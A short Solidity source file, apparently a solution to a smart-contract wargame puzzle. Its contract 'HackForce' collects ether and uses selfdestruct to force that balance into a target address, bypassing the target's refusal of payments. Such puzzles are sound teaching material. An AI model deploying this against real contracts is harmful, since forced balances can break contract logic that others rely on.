// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackForce {
    function attack(address ad) external {
        selfdestruct(payable(ad));
    }

    receive() external payable {

    }
}